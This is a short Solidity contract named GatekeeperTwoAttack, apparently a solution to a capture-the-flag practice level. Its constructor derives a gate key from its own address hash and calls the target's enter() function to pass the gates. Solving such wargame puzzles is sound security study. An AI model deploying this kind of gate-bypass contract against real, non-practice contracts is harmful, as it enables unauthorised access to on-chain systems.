// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GateKeeperTwo {
   function enter(bytes8 _gateKey) external returns (bool); 
}

contract GatekeeperTwoAttack {

    constructor(address _gatekeeperAddr) {
       bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
       GateKeeperTwo(_gatekeeperAddr).enter(key);
    }

}